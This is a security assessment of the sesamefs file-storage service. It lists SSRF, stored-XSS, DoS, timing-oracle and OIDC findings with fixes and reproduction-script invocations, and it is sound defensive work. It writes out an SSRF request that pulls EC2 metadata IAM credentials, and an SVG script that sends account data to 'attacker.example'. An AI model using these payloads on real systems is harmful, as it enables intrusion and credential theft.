# Security Assessment — 2026-04

**Date:** 2026-04-09
**Scope:** sesamefs backend (Go), frontend (React), dependencies, and the
**production** deployment topology (sesamefs behind an HTTPS reverse proxy,
AWS S3 for object storage, Cassandra on a private subnet, pinned OnlyOffice,
OIDC enabled against a custom trusted provider).
**Threat model:** external attacker with access to the public source tree,
reaching the service over HTTPS on the internet. No server access, no
insider knowledge beyond the repo. This is an open-source project; assume
the attacker has read every line of code.
**Methodology:** static code review + dependency CVE audit, live black-box
probing of a pre-production instance for the unauthenticated surface, and
targeted code tracing to confirm reachability of suspected bugs before
assigning severity.

This is a production-only assessment. Development defaults are out of scope —
the `docker compose up` experience is intentionally permissive so that
evaluators can kick the tyres in thirty seconds, and this report does not
count that permissiveness as a vulnerability. What it *does* count as a
vulnerability is any path by which those dev defaults can silently reach a
production deployment. That class of problem is addressed by one mechanism:
the **production preflight** described below, which is now part of the
compose stack and the `.env` bootstrap flow.

## Production prerequisites & the preflight gate

Before a production deployment is allowed to start, every item in the table
below must be set. The repository now ships a preflight that enforces this
automatically.

| Env var | Required | Must not be |
|---|---|---|
| `AUTH_DEV_MODE` | `false` | any truthy value |
| `SHARE_LINK_HMAC_KEY` | ≥32 random bytes | known dev default, empty |
| `SERVER_URL` | full https URL | empty |
| `BILLING_URL` | full https URL | empty |
| `ACCOUNTS_PASSWORD_CHANGE_URL` | full https URL | empty |
| `ACCOUNTS_DELETE_ACCOUNT_URL` | full https URL | empty |
| `OIDC_ISSUER` | https URL of your IdP | empty, plain http |
| `OIDC_CLIENT_ID` / `OIDC_CLIENT_SECRET` | set | empty |
| `OIDC_JWT_SIGNING_KEY` | ≥32 random bytes | empty |
| `OIDC_REDIRECT_URIS` | set | empty |
| `OIDC_REQUIRE_PKCE` | `true` | anything else (warning) |
| `ONLYOFFICE_JWT_SECRET` | ≥32 random bytes | `change-me-to-a-random-string` |
| `S3_BUCKET` / `S3_REGION` | set | empty |
| `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` | set | `minioadmin` |
| `CASSANDRA_HOSTS` | set | empty |
| `CASSANDRA_USERNAME` / `CASSANDRA_PASSWORD` | set unless private subnet | empty (warning) |

### How to run the gate

The preflight is a self-contained bash script at
[`../scripts/prod-preflight.sh`](../scripts/prod-preflight.sh). It reads the
environment, validates everything in the table above, prints a per-check
pass/warn/fail line, and exits non-zero on any hard failure. No curl, no
container runtime probes, no dependencies beyond bash + coreutils — safe to
run inside a minimal alpine image or on any CI runner.

**Option A — manual run before `compose up`:**

The repo ships [`.env.example`](../.env.example) as a template and the
preflight can bootstrap `.env` for you, generating every random secret
inline:

```bash
# Step 1: create .env and fill every auto-generatable secret
./scripts/prod-preflight.sh --init-env

# Step 2: edit .env to fill in the values the script CANNOT generate —
# OIDC_CLIENT_ID / OIDC_CLIENT_SECRET (from your IdP),
# AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY (from AWS IAM),
# CASSANDRA_USERNAME / CASSANDRA_PASSWORD (from your Cassandra admin).
$EDITOR .env

# Step 3: export into the current shell, validate, launch
set -a; source .env; set +a
./scripts/prod-preflight.sh
docker compose up -d
```

`--init-env` is **idempotent and non-destructive**: it never overwrites a
value you already set. The only exception is documented dev-default strings
(e.g. `ONLYOFFICE_JWT_SECRET=change-me-to-a-random-string`) which are
always replaced with fresh random bytes.

Auto-generated secrets:

| Var | How it's generated | Why not the others |
|---|---|---|
| `SHARE_LINK_HMAC_KEY` | `openssl rand -hex 32` (or `/dev/urandom`) | — |
| `ONLYOFFICE_JWT_SECRET` | same | — |
| `OIDC_JWT_SIGNING_KEY` | same | — |
| `AWS_ACCESS_KEY_ID/SECRET` | **NOT generated** | must come from AWS IAM |
| `OIDC_CLIENT_ID/SECRET` | **NOT generated** | must come from your IdP |
| `CASSANDRA_USERNAME/PASSWORD` | **NOT generated** | must match the Cassandra side |

**Option B — wired into docker-compose (recommended for prod):**
The main `docker-compose.yaml` defines a `preflight` service under the
`prod` compose profile, and `docker-compose.prod-gate.yaml` adds a
`depends_on: preflight: service_completed_successfully` to sesamefs. To
launch production:
```bash
docker compose \
  -f docker-compose.yaml \
  -f docker-compose.prod-gate.yaml \
  --profile prod \
  up -d
```
Compose will block sesamefs from starting until the preflight exits 0. If the
preflight fails, the whole `up` fails and the findings are printed in the
compose log.

Dev users doing `docker compose up` without the `prod` profile are
unaffected — the preflight simply isn't part of the graph they run.

The preflight neutralizes these classes of problem so they do not appear in
[Code vulnerabilities](#code-vulnerabilities) below:

- dev-mode superadmin (`AUTH_DEV_MODE=true`),
- `ONLYOFFICE_JWT_SECRET` left at its documented default,
- MinIO defaults (`minioadmin:minioadmin`) reaching prod,
- missing `SHARE_LINK_HMAC_KEY` / too-short key,
- missing required external URLs,
- `OIDC_ENABLED=true` with blank issuer / client / signing key,
- baked-in `auth.dev_mode: true` in a mounted config file.

---

## TL;DR

With the preflight in place, the production-reachable issues that remain are
code and dependency bugs that no amount of configuration hygiene will fix.
The top of the list is:

1. **SSRF in the OnlyOffice editor callback** (C-1). The "save document" URL
   is fetched via bare `http.Get` with no IP allow-list, no private-range
   blocking, no redirect policy, no body size cap. The fetched bytes are
   then written into a library file — turning SSRF into arbitrary-content
   file write in a single request. Gated only by the OnlyOffice shared JWT,
   which ships as `change-me-to-a-random-string` in local compose and is
   caught by the preflight only if operators actually run it.
2. **User-uploaded files are served `inline` from the application origin**
   (C-2) with no `X-Content-Type-Options: nosniff` and with SVG/HTML mapped
   to their "correct" content-type. Classic stored XSS into session and
   API-key exfiltration.
3. **`golang-jwt/jwt` v5.3.0 is vulnerable to CVE-2025-30204** (H-1) —
   memory-exhaustion DoS via a pathological header. Reachable pre-auth.
4. A cluster of **HIGH** issues around share-link security (token
   enumeration oracle with the real API endpoint, `==` on the HMAC cookie),
   repo API tokens bypassing account-status checks, weak rate-limiting on
   both authentication and bulk upload/download, and OIDC role claims being
   trusted verbatim.
5. One previously-filed **Critical** finding — **OIDC `aud` claim not
   validated** — has been reclassified to a **Latent / defense-in-depth**
   issue after live code tracing. The code defect is real, but in the
   current code paths there is no way for an attacker to feed an
   externally-supplied ID token into the buggy parser. See
   [L-1](#l-1-oidc-aud-claim-not-validated-latent--defense-in-depth) for
   the trace and the regression-prevention unit test.

### What was confirmed live against a pre-production instance

The unauthenticated portion of the exploit sweep was run against a live
pre-production deployment of sesamefs fronted by nginx with the production
config applied. The scorecard:

| Finding | Status on the live instance |
|---|---|
| **M-1** unauth `DELETE /api/v2.1/auth/session` → HTTP 200 | ✅ reproduced |
| **M-2** CORS: `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` | ✅ reproduced |
| **M-3** missing `CSP`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy` | ✅ 5 / 5 missing |
| **H-5** share-link token enumeration via `/api/v2.1/share-links/:token/dirents/` (non-existent → `404 {"error":"share link not found"}`, existent → `200` with dir listing) | ✅ oracle confirmed |
| **H-7** `/api2/auth-token/` rate limit | ⚠️ 24 / 120 login attempts accepted in a single burst — tighter than initially reported but still loose for distributed stuffing |
| **M-5** `/metrics` on the public listener | ❌ **blocked at the reverse proxy (HTTP 403)** on the probed deployment — see finding for why it still counts as a defense-in-depth concern |
| **LOW** `/api/v2.1/bootstrap`, `/api2/server-info`, `/health`, `/ready`, `/api/v2.1/auth/oidc/config` reachable unauth | ✅ all 200 — leak version, features, issuer URL, and the configured OIDC client id |
| **H-1** golang-jwt memory DoS | ⏳ not demonstrated at safe default probe size; requires a larger payload on infrastructure you own to visibly trip |

The remaining findings either need credentials, an IdP-issued token, or a
destructive opt-in (zip-bomb, state-flood) and were not run live.

### Positive findings

Credit where it's due. These are working correctly and should stay that way:

- **Signing-algorithm pinning in `parseIDToken`** (`internal/auth/oidc.go:398-408`) — explicitly whitelists RSA and ECDSA methods. HS256 "algorithm confusion" attacks using the JWKS public key as an HMAC secret do not land.
- **`crypto/rand`** is used for every security-relevant random value (share-link tokens, state, nonce, CSRF).
- **Argon2id** is available for password hashing and is the preferred path.
- **Cassandra queries use gocql bound parameters** throughout the reviewed handlers — no CQL-injection surface was found.
- **`encoding/xml`** stdlib is not misused; no custom XML decoder on untrusted input.
- **Prod-mode already refuses to start without an explicit `cors.allowed_origins`** (`internal/config/config.go:1014`) — the right pattern, and the model for extending the preflight.
- **No `/debug/pprof`, `/debug/vars`, `.git`, `.env`, source maps, or swagger** exposed on the live pre-prod instance.
- **`/metrics` blocked at the reverse proxy** on the live pre-prod instance — good operational hygiene.
- **The broker's discovery document reports `request_parameter_supported: false`** — request-object phishing is not possible.

---

## Reproduction scripts

Every finding below has a matching script in
[`./exploit-scripts/`](./exploit-scripts/) that takes the target host URL
and any required credentials on the command line, so you can re-verify
against any environment. The run command is shown inline with each finding.
The folder also ships
[`run-all-unauth.sh`](./exploit-scripts/run-all-unauth.sh) which chains
every credential-free probe in one pass:

```bash
./docs/exploit-scripts/run-all-unauth.sh --host https://your-env.example.com
```

---

## Code vulnerabilities

These apply even with a correctly-hardened production configuration.

### CRITICAL

#### C-1 SSRF in OnlyOffice editor callback → arbitrary-content file write

**File:** `internal/api/v2/onlyoffice.go:504-660` (`EditorCallback` → `saveEditedDocument`), bare `http.Get` at `:660`.
**Prerequisites:** ability to POST to `/onlyoffice/editor-callback`. Gated by `ONLYOFFICE_JWT_SECRET` — if that secret is strong, the attacker needs to be OnlyOffice itself or to have compromised the secret; if the secret is the default from local compose (`change-me-to-a-random-string`), any internet attacker reaches it. The preflight catches the default, but only if operators actually run it.
**Severity:** Critical.

The callback handler receives a JSON body with a `url` field pointing at the new document content. `saveEditedDocument` calls `http.Get(internalURL)` directly:

- no URL parsing or host allow-list,
- no blocking of loopback / link-local / RFC1918 / `169.254.169.254`,
- no redirect policy (`http.DefaultClient` follows up to ten redirects, each re-resolved),
- no response body size cap,
- no connection timeout.

The fetched bytes are then written as the new file content in the target library.

**Exploit (assuming weak/default `ONLYOFFICE_JWT_SECRET`):**

```
POST /onlyoffice/editor-callback?repo_id=<attacker's lib>&file_path=/out.bin
Content-Type: application/json
Authorization: Bearer <HS256 JWT signed with the default secret>

{
  "status": 2,
  "key": "x",
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
}
```

Server fetches the EC2 instance-metadata IAM credentials and writes them verbatim into `out.bin` in the attacker's own library. The attacker then downloads `out.bin` and gets temporary AWS credentials. Chain of SSRF → credential exfiltration → potential full S3 compromise.

Replace the URL with any internal service (`http://cassandra:9042/`, `http://localhost:8080/admin/...`, a peer on the private subnet) for different blast radii.

**Live probe observation:** in prod mode, `POST /onlyoffice/editor-callback` with no auth returned `{"error":0}` — i.e. the handler accepted the request at the HTTP level. That needs a close read to determine whether the JWT check is genuinely enforced as the first step or whether it's lenient on missing tokens. Either way, the fetch itself lacks SSRF protection regardless of how it's reached.

**Fix:**

1. Verify the JWT before touching any field of the request body. Fail closed.
2. Before `http.Get`, parse the URL, resolve to IP, reject private/loopback/link-local/`169.254.169.254`.
3. Use an `http.Client` with a ≤10 s connection timeout, ≤5 redirect hops each re-validated, and a `MaxBytesReader` response body.
4. Log the effective target host on every fetch for auditing.

**Reproduce:** [`c2-onlyoffice-ssrf.sh`](./exploit-scripts/c2-onlyoffice-ssrf.sh) (script filename retains its original prefix; see the note at the end of [Findings explicitly not counted](#findings-explicitly-not-counted))

```bash
./docs/exploit-scripts/c2-onlyoffice-ssrf.sh \
    --host https://storage.example.com \
    --secret "$ONLYOFFICE_JWT_SECRET" \
    --repo <uuid of a repo you control> \
    --file /ssrf-probe.bin \
    --fetch-url http://httpbin.org/uuid
```

Start with a harmless `--fetch-url` like `http://httpbin.org/uuid` to prove the write path. If accepted, escalate to `http://169.254.169.254/...` on an EC2 deployment (or any internal URL on other clouds) to demonstrate the SSRF blast radius. Follow-up download instructions are printed by the script.

---

#### C-2 User-uploaded files served inline from the app origin → stored XSS

**Files:** `internal/api/v2/sharelink_view.go:860, 867` (`handleShareLinkRaw` sets `Content-Disposition: inline` with attacker-controlled MIME); MIME helper `resolveInlineContentType:650-710` maps SVG to `image/svg+xml`.
**Prerequisites:** ability to upload a file and share it (internal user, or a share link that permits uploads).
**Severity:** Critical.

Downloads emit `Content-Disposition: inline` with the file's declared MIME, no `X-Content-Type-Options: nosniff`, served from the same origin as the main application. Browsers execute inline `<script>` in SVG.

**Exploit:**

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('/api2/account/info', {credentials:'include'})
      .then(r => r.text())
      .then(t => fetch('https://attacker.example/?d=' + btoa(t)));
  </script>
</svg>
```

Upload, share, send the link to a victim. The script runs in the sesamefs origin and exfiltrates the victim's session (or, for a superadmin victim, admin-level access). The finding becomes even more dangerous when combined with **M-3** (missing `X-Content-Type-Options: nosniff`) because browsers that would otherwise sniff-protect non-SVG types no longer do.

Same class of attack lands with uploaded `.html` and with PDFs that carry JavaScript payloads.

**Fix:** For anything outside a narrow known-safe allow-list (PNG/JPEG/WebP and — carefully — plain PDF), force `Content-Disposition: attachment`, always emit `X-Content-Type-Options: nosniff`. The architectural fix is to serve user content from a separate sandbox origin (e.g. `user-content.sesamedisk.com`) with no cookies scoped to it.

**Reproduce:** [`c3-inline-svg-xss.sh`](./exploit-scripts/c3-inline-svg-xss.sh) (script filename retains its original prefix)

```bash
./docs/exploit-scripts/c3-inline-svg-xss.sh \
    --host https://storage.example.com \
    --token <your-user-api-token> \
    --repo <repo-uuid-you-control>
```

Uploads a benign SVG (red rectangle, no script), creates a share link, fetches the raw file through the share viewer, and inspects the response headers. Exit 0 means `Content-Disposition: inline` was observed and/or `X-Content-Type-Options: nosniff` was missing, which is sufficient to prove the finding without ever shipping executable content.

---

### HIGH

#### H-1 golang-jwt/jwt v5.3.0 — CVE-2025-30204 (memory exhaustion DoS)

**Files:** `go.mod` and every JWT call site in `internal/auth/*` and `internal/api/v2/onlyoffice.go`.
**Prerequisites:** unauthenticated. Any endpoint that parses an `Authorization: Bearer …` header is reachable.
**Severity:** High.

The vulnerable v5 releases have O(n) memory allocation on pathologically-long dotted inputs. A single request with a Bearer value of a few tens of MB of dots exhausts the parser's memory before any validity check runs.

**Fix:** upgrade `github.com/golang-jwt/jwt/v5` to the patched release, re-run `go mod tidy`, re-vendor.

**Reproduce:** [`h1-jwt-memory-dos.sh`](./exploit-scripts/h1-jwt-memory-dos.sh)

```bash
# Safe default (1000 dots, non-destructive latency probe)
./docs/exploit-scripts/h1-jwt-memory-dos.sh --host https://storage.example.com

# Full DoS demonstration — only against infrastructure you own and can restart
./docs/exploit-scripts/h1-jwt-memory-dos.sh \
    --host https://storage.example.com \
    --size 500000 --i-accept-destructive
```

Script measures latency of a pathological Bearer header vs a normal one on `/api2/account/info` and reports the ratio.

---

#### H-2 API key comparison has a timing oracle

**File:** `internal/apikeys/apikeys.go:183-221` (`ValidateKey`).
**Severity:** High.

Tokens are SHA-256 hashed and looked up in Cassandra. Two problems:

1. The "not found" path returns early via a driver error, producing a measurably different latency from the "found" path.
2. No `crypto/subtle.ConstantTimeCompare` is used on any downstream equality of the raw token (e.g. prefix display, cache lookup).

Combined with a distributed attacker, this creates a latency oracle for enumerating valid key hashes.

**Fix:** Always fetch a dummy row on miss so both branches take equal time; use `subtle.ConstantTimeCompare` on any final plaintext comparison.

**Reproduce:** [`h2-apikey-timing.sh`](./exploit-scripts/h2-apikey-timing.sh)

```bash
./docs/exploit-scripts/h2-apikey-timing.sh \
    --host https://storage.example.com \
    --valid-key <known-valid-api-key> \
    --samples 500
```

Measures per-request latency for random "not-found" keys vs a known-valid key and prints mean / median / p95 for each class. A consistently higher median for the valid key (or a consistently different median across random classes) is the oracle.

---

#### H-3 Repo API tokens skip the account-status check

**File:** `internal/api/server.go:918-943` (repo-token auth branch of `authMiddleware`).
**Severity:** High.

User API keys are validated with `enforceAccountStatus` at line 901 (deactivating a user kills their keys). Repo API tokens bypass that check entirely.

**Impact:** a user who has been deactivated, or whose org has been suspended, can continue to access the system via any repo API token they issued prior to being disabled. Account lifecycle is effectively broken.

**Fix:** apply `enforceAccountStatus(c, generatedBy, orgID)` on the repo-token branch too.

**Reproduce:** [`h3-repo-token-status-bypass.sh`](./exploit-scripts/h3-repo-token-status-bypass.sh)

```bash
./docs/exploit-scripts/h3-repo-token-status-bypass.sh \
    --host https://storage.example.com \
    --repo-token <repo token from a now-deactivated user> \
    --repo <repo-uuid>
```

Precondition: an admin must deactivate the user whose repo-token you supply. Exit 0 means the repo-token still returns 200 on a data-plane call after the user is disabled.

---

#### H-4 OIDC role claim trusted verbatim → IdP-to-superadmin

**File:** `internal/auth/oidc.go:690-697` (`extractRoles` + `mapOIDCRole`).
**Severity:** High (prerequisite: permissive or attacker-controlled IdP on the same issuer).

If the configured IdP lets a user influence their `roles` claim — corporate IdPs with lax app registrations, self-signup IdPs, multi-tenant IdPs where an attacker controls a test tenant — sesamefs maps the first role in the claim directly into its local role. Combined with `auto_provision: true` in `configs/config.prod.yaml:82` and no email-domain allow-list, a self-registered IdP identity can become a sesamefs user, and with a poisoned roles claim, potentially an elevated one.

This is less dangerous in a deployment using a trusted custom broker that tightly controls which upstream providers are accepted and which claims are propagated — but the code defect remains, and anyone who later enables auto-provisioning for a less curated upstream inherits the risk.

**Fix:**

- Maintain a server-side allow-list of local role names honored from OIDC.
- Never allow `superadmin` to be set via claim; that role is reserved for explicit admin action.
- Add an email-domain allow-list for auto-provisioning.
- Optionally re-fetch and re-verify roles from the IdP's `userinfo` endpoint rather than trusting ID-token claims.

**Reproduce:** [`h4-oidc-role-escalation.sh`](./exploit-scripts/h4-oidc-role-escalation.sh)

```bash
./docs/exploit-scripts/h4-oidc-role-escalation.sh \
    --host https://storage.example.com \
    --session <session bearer obtained after logging in with a crafted roles claim>
```

The hard part is getting the IdP to mint a token with your chosen roles claim; the script only tests whether the resulting sesamefs session reaches admin endpoints. Exit 0 means the elevated role was honored.

---

#### H-5 Share-link token enumeration oracle

**File:** `internal/api/v2/sharelink_view.go:137-170` (`GET /d/:token` viewer) and the resolving API at `/api/v2.1/share-links/:token/dirents/`.
**Severity:** High.

On the browser-facing viewer `/d/:token` the frontend SPA returns the same HTML shell for every token, so there is no oracle there. The **real** oracle is on the API endpoint the SPA consumes: `GET /api/v2.1/share-links/:token/dirents/` returns a distinguishable response for non-existent tokens:

```
$ curl -si https://<host>/api/v2.1/share-links/aaaaaaaa/dirents/
HTTP/2 404
content-type: application/json
{"error":"share link not found"}

# A valid token returns HTTP 200 and the directory listing JSON.
```

There is no per-IP or global rate limit on this path beyond the generic auth rate limiter (which is `rate.Every(6s), burst 10` — see H-7). Whether the oracle is usefully exploitable depends on the entropy of share-link tokens: if tokens are ≥128 bits of `crypto/rand` output, brute force is infeasible at any realistic rate, and the oracle is purely a "confirm-if-you-already-have-a-guess" tool. Verify the entropy in `generateShareLinkToken`.

**Fix:**

- Uniform 404 for both "not found" and "expired / disabled" at the API endpoint.
- Dedicated per-IP and global throttle on `/api/v2.1/share-links/:token/*` routes.
- Confirm and enforce token length ≥22 URL-safe base64 characters (≈128 bits).

**Reproduce:** [`h5-sharelink-enumeration.sh`](./exploit-scripts/h5-sharelink-enumeration.sh) (updated to probe the API endpoint, not the SPA viewer)

```bash
# Basic probe: shows response distribution from random tokens
./docs/exploit-scripts/h5-sharelink-enumeration.sh --host https://storage.example.com

# A/B comparison with a known-valid token (required to prove the oracle)
./docs/exploit-scripts/h5-sharelink-enumeration.sh \
    --host https://storage.example.com \
    --known <valid-share-token> \
    --count 100
```

Exit 0 means the known-valid response is distinguishable from a random-token response (different HTTP code or body length).

---

#### H-6 Share-link password-cookie compared with `==`

**File:** `internal/api/v2/sharelink_view.go:1570-1579`.
**Severity:** High (once the cookie mechanism is understood by an attacker — not exploitable purely as a drive-by).

Bcrypt verifies the password itself correctly. The HMAC cookie that grants continued access after password entry is compared with raw `==`, leaking byte-level timing.

**Fix:** `subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1`.

**Reproduce:** [`h6-sharelink-cookie-timing.sh`](./exploit-scripts/h6-sharelink-cookie-timing.sh)

```bash
./docs/exploit-scripts/h6-sharelink-cookie-timing.sh \
    --host https://storage.example.com \
    --token <password-protected share token> \
    --password <correct password> \
    --samples 500
```

Obtains the real cookie, then measures latency for the valid cookie and for three variants with one byte flipped at different positions (beginning, middle, end). Non-constant-time comparison manifests as `flip@0` being fastest and `flip@last` slowest.

---

#### H-7 Weak rate-limit on `/api2/auth-token`; no rate-limit on upload/download

**File:** `internal/api/server.go` (authRL construction), `internal/api/server_routes.go:105`.
**Severity:** High.

`authRL` is configured as `rate.Every(6s), burst 10`. **Live probing** against a pre-production deployment showed a 120-request serial burst from a single IP resulted in 24 × HTTP 401 (accepted for authentication processing) and 96 × HTTP 429 (rate-limited). That is tighter than a naive reading of the code implies — but 24 per burst is still loose against distributed credential stuffing, which is by definition not limited to one IP.

Upload, download, and `/api/v2/blocks/upload` have no rate limit at all — a single IP can saturate bandwidth, fill storage, or keep many concurrent chunked uploads open. The `max_upload_mb: 20480` config value in `configs/config.prod.yaml:38` should be enforced end-to-end on the streaming path.

**Fix:**

- Tighten `/api2/auth-token` to ≤5 req/min/IP with exponential penalty on failures, and add per-*account* throttling keyed on the submitted username/email.
- Per-user and per-IP throttles on upload, download, and block endpoints.
- Enforce `max_upload_mb` with an early `http.MaxBytesReader` on every upload path.

**Reproduce:** [`h7-auth-rate-limit.sh`](./exploit-scripts/h7-auth-rate-limit.sh)

```bash
./docs/exploit-scripts/h7-auth-rate-limit.sh \
    --host https://storage.example.com \
    --count 120
```

Prints how many of 120 serial login attempts were accepted vs rate-limited.

---

#### H-8 Zip/archive bomb on directory download

**File:** `internal/api/seafhttp.go:1884-1997` (`addDirToZip`, `addFileToZip`).
**Severity:** High.

The "download directory as ZIP" path has no file-count cap, no depth cap, and no total-byte cap. A shared directory with a million files (or a constructed directory tree that cycles through aliases) will OOM the server. The streaming writer must have hard ceilings.

**Fix:** enforce `MaxEntries`, `MaxDepth`, `MaxTotalBytes` in `addDirToZip`; wrap the writer with a counter that aborts on overrun; set a deadline on the request.

**Reproduce:** [`h8-zip-bomb.sh`](./exploit-scripts/h8-zip-bomb.sh)

```bash
./docs/exploit-scripts/h8-zip-bomb.sh \
    --host https://storage.example.com \
    --token <user-token> \
    --repo <repo with a large directory> \
    --dir / \
    --i-accept-destructive
```

Destructive: requires the operator to opt in. Streams the zip of a directory and prints bytes/time; watch server memory during the stream. Unbounded growth or a crash reproduces the finding.

---

#### H-9 OIDC discovery / JWKS has no DNS-rebinding defense

**File:** `internal/auth/oidc.go:172-189` (`GetDiscovery`).
**Severity:** High (blast radius bounded by who controls the issuer hostname — for tenants that permit user-supplied OIDC issuers, this is real; for deployments against a single trusted custom broker on a stable domain, the risk is low).

Discovery and JWKS are fetched via the default `http.Client` with a 10-second timeout. The host is re-resolved between the two fetches (discovery, then JWKS), and nothing prevents the second DNS answer from pointing at a different IP. An attacker-controlled issuer hostname with a short TTL can flip from a real-looking IdP to `127.0.0.1`, `169.254.169.254`, or a peer internal service — either serving attacker-controlled JWKS (making forged JWTs validate) or pivoting to internal infrastructure.

**Fix:** resolve once, pin the IP for the connection, reject private/loopback addresses pre-connection.

**Reproduce:** no dedicated script. H-9 requires an attacker-controlled DNS name with a short TTL, which is infrastructure, not a single HTTP request. To validate the fix, add a unit test in `internal/auth/oidc_test.go` that injects a `Resolver` which flips the returned IP between calls and asserts that the second fetch is refused.

---

### MEDIUM

#### M-1 Unauthenticated CSRF logout on `DELETE /api/v2.1/auth/session`

**File:** `internal/api/v2/auth.go:301-324`.
**Severity:** Medium (annoyance-grade CSRF, not an auth bypass — logging a victim out is not a privilege event).

The handler clears the `sesamefs_auth` cookie without requiring the caller to present it. Any HTML form or `fetch` from a third-party origin that hits the URL logs the victim out. **Confirmed live** on a pre-production deployment: `curl -X DELETE` with no credentials returns `HTTP/2 200`. Combined with M-3 (no `X-Frame-Options: DENY`), the attacker page can also embed the login flow in an iframe and clickjack the re-login, chaining M-1 + M-3 into a credential-phishing primitive.

**Fix:** require the session cookie and a valid CSRF token, or rely on strict `SameSite` cookies and verify the Origin/Referer header.

**Reproduce:** [`m1-csrf-logout.sh`](./exploit-scripts/m1-csrf-logout.sh)

```bash
./docs/exploit-scripts/m1-csrf-logout.sh --host https://storage.example.com
```

No credentials required. Exit 0 means `DELETE /api/v2.1/auth/session` returned 2xx without an authenticated caller.

---

#### M-2 CORS `allowed_origins: ["*"]` with `Allow-Credentials: true`

**Files:** `configs/config.prod.yaml:207-209`; applied in `internal/api/server.go:240-267`.
**Severity:** Medium (config smell with a real impact on unauthenticated endpoints; not a credentialed-CORS bypass because browsers reject the `*` + credentials combo on credentialed requests).

Browsers will not send credentials to a response that carries `Access-Control-Allow-Origin: *`, so the "evil.com reads /api/v2.1/admin/users as the victim" attack does not land. What does land:

- Any third-party origin can `fetch` unauthenticated endpoints (`/api/v2.1/bootstrap`, `/api2/server-info`, `/api/v2.1/auth/oidc/config`, public share-link routes) and read the bodies. That enables fingerprinting, tenant enumeration, and cross-origin timing attacks against the oracle-y endpoints in H-5.
- The config is a footgun: if someone later "fixes" credentialed CORS by switching to reflected-origin without an allow-list, the server will silently become a full credentialed-CORS bypass.
- The comment in `configs/config.prod.yaml` claims "Safe to leave as `*` for bearer-token APIs (no cookie auth)" — but the app sets `sesamefs_auth` as an HTTP cookie during the OIDC flow. The comment is wrong about its own codebase.

**Confirmed live** on a pre-production deployment: the preflight returned `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` on both `OPTIONS` and a simple `GET` of `/api/v2.1/bootstrap` with `Origin: https://evil.example`.

**Fix:** explicit origin allow-list from env (`CORS_ALLOWED_ORIGINS=https://app.example.com,https://admin.example.com`), drop `Allow-Credentials` unless there's an origin that needs it, and if you switch to reflected-origin, validate against the allow-list before echoing.

**Reproduce:** [`m2-cors-misconfig.sh`](./exploit-scripts/m2-cors-misconfig.sh)

```bash
./docs/exploit-scripts/m2-cors-misconfig.sh --host https://storage.example.com
```

Sends a preflight and a simple GET with `Origin: https://evil.example` and reports the `Access-Control-Allow-*` response headers. Exit 0 means the footgun combination (`ACAO: *` + `ACAC: true`, or reflected third-party origin) was observed.

---

#### M-3 Security response headers missing

Observed on every sesamefs response — including **confirmed live** on a pre-production deployment, all five of these were missing on `/api2/ping`:

| Header | Present? |
|---|---|
| Content-Security-Policy | ❌ |
| X-Frame-Options | ❌ |
| X-Content-Type-Options | ❌ |
| Strict-Transport-Security | ❌ |
| Referrer-Policy | ❌ |

Combined with **C-2**, the missing `X-Content-Type-Options: nosniff` directly enables the MIME-confusion variant of the stored-XSS exploit. Combined with **M-1**, the missing `X-Frame-Options: DENY` enables login clickjacking.

**Fix:** a small Gin middleware that unconditionally emits:

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'
```

**Reproduce:** [`m3-security-headers.sh`](./exploit-scripts/m3-security-headers.sh)

```bash
./docs/exploit-scripts/m3-security-headers.sh --host https://storage.example.com
```

Exit 0 means at least one of the five headers was missing on `/api2/ping`.

---

#### M-4 Email-existence oracle via `/api2/avatars/user/:email/resized/:size`

The endpoint returns non-404 responses for arbitrary emails, with observable differences between known and unknown addresses. It enables targeted phishing and credential-stuffing input filtering.

**Fix:** require auth, or always return a default avatar blob regardless of whether the user exists.

**Reproduce:** [`m4-avatar-email-enum.sh`](./exploit-scripts/m4-avatar-email-enum.sh)

```bash
./docs/exploit-scripts/m4-avatar-email-enum.sh \
    --host https://storage.example.com \
    --known real.user@example.com
```

Optional `--unknown EMAIL`; defaults to a random non-existent address. Exit 0 means the known and unknown responses differ.

---

#### M-5 `/metrics` exposed on the public listener (defense in depth)

**Live status:** on the pre-production deployment that was probed, `/metrics` returned `HTTP 403` from the reverse proxy — the upstream nginx layer correctly refuses external access. This is the right operational posture and it is working. ✅

The finding is kept because sesamefs itself serves Prometheus metrics unauthenticated on its own port, and the histogram labels include the `path` label — effectively a real-time map of every distinct route accessed. The day an operator misconfigures the proxy, sets up a direct port-forward for debugging, runs sesamefs in an environment without a proxy, or changes ingress controllers, the leak is back. **Do not rely on the reverse proxy alone.**

**Fix:** bind `/metrics` to a separate local-only listener in the Go binary (e.g. `127.0.0.1:9090`), or require an internal-auth token on the metrics handler. Either makes the finding impossible regardless of upstream configuration.

**Reproduce:** [`m5-metrics-exposure.sh`](./exploit-scripts/m5-metrics-exposure.sh)

```bash
./docs/exploit-scripts/m5-metrics-exposure.sh --host https://storage.example.com
```

Exit 0 means `/metrics` returned 200 with Prometheus exposition content unauthenticated on the public listener. Exit 1 (as observed on the probed pre-prod deployment) means the proxy layer is blocking it — the underlying code issue is still open.

---

#### M-6 OIDC in-memory `states` map has no TTL or cap

**File:** `internal/auth/oidc.go:49-52`.

Looping `/api/v2.1/auth/oidc/login` without completing the flow leaks memory forever. No sweeper, no bound on map size. Slow DoS.

**Fix:** attach an `ExpiresAt` to `AuthState`, run a background sweeper every few minutes, enforce a hard cap (e.g. 10k entries).

**Reproduce:** [`m6-oidc-state-flood.sh`](./exploit-scripts/m6-oidc-state-flood.sh)

```bash
./docs/exploit-scripts/m6-oidc-state-flood.sh \
    --host https://storage.example.com \
    --count 1000 \
    --i-accept-destructive
```

Destructive: requires opt-in. Fires N `oidc/login` init requests without completing the flow; watch server memory grow.

---

#### M-7 Session invalidation is node-local

**File:** `internal/auth/session.go:440-504` (`InvalidateUserSessions`).

